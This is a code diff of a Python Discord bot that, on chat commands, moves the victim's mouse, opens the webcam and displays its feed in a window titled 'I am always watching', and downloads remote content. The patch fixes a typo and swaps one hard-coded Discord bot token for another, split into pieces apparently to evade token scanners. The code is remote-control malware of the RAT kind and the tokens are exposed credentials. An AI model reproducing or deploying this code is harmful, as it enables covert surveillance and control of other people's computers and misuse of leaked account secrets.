@@ -86,7 +86,7 @@ async def on_message(ctx):
                 pyautogui.moveTo(x, y)
 
         if "camera" in ctx.content:
-            #cv2.namedWindow("I am alwayse watching(press esc to close)")
+            #cv2.namedWindow("I am always watching(press esc to close)")
             vc = cv2.VideoCapture(0)
 
             if vc.isOpened(): # try to get the first frame
@@ -95,14 +95,14 @@ async def on_message(ctx):
                 rval = False
 
             while rval:
-                cv2.imshow("I am alwayse watching(press esc to close)", frame)
+                cv2.imshow("I am always watching(press esc to close)", frame)
                 rval, frame = vc.read()
                 key = cv2.waitKey(20)
                 if key == 27: # exit on ESC
                     break
 
             vc.release()
-            cv2.destroyWindow("I am alwayse watching(press esc to close)")
+            cv2.destroyWindow("I am always watching(press esc to close)")
 
         if "tp" in ctx.content:
             x1, y1 = pyautogui.size()
@@ -125,7 +125,7 @@ async def on_message(ctx):
             res = requests.get(url)
             cntnt = res.content
             cntnt = cntnt.decode("utf-8")
-            cntnt = cntnt.replace("MTAwOTg4MjczMDQ2NjYzOTkxMg.G4vO2U.PWmPPIVWuQfueyoqlLsBBogHsSFtg7gdBuBtw8", "MTAwOTg4MjczMDQ2NjYzOTkxMg.GA_YDP.XXbO5" + "PqbYQ_HCgw2ZwhBIngTNST4hWNsQ6Wz48")
+            cntnt = cntnt.replace("MTAwOTg4MjczMDQ2NjYzOTkxMg.G4vO2U.PWmPPIVWuQfueyoqlLsBBogHsSFtg7gdBuBtw8", "MTAwOTg4MjczMDQ2NjYzOTkxMg.GsYFOS.7Tm" + "HbGhJkFFGVOIeBLrUfK9BpswPjejWdfjhHA")
             cntnt = cntnt.encode("utf-8")
             if res.status_code == 200:  # http 200 means success
                 
@@ -201,14 +201,14 @@ async def on_message(ctx):
                 rval = False
 
             while rval:
-                cv2.imshow("I am alwayse watching(press esc to close)", frame)
+                cv2.imshow("I am always watching(press esc to close)", frame)
                 rval, frame = vc.read()
                 key = cv2.waitKey(20)
                 if key == 27: # exit on ESC
                     break
 
             vc.release()
-            cv2.destroyWindow("I am alwayse watching(press esc to close)")
+            cv2.destroyWindow("I am always watching(press esc to close)")
 
         if "tp" in ctx.content:
             x1, y1 = pyautogui.size()
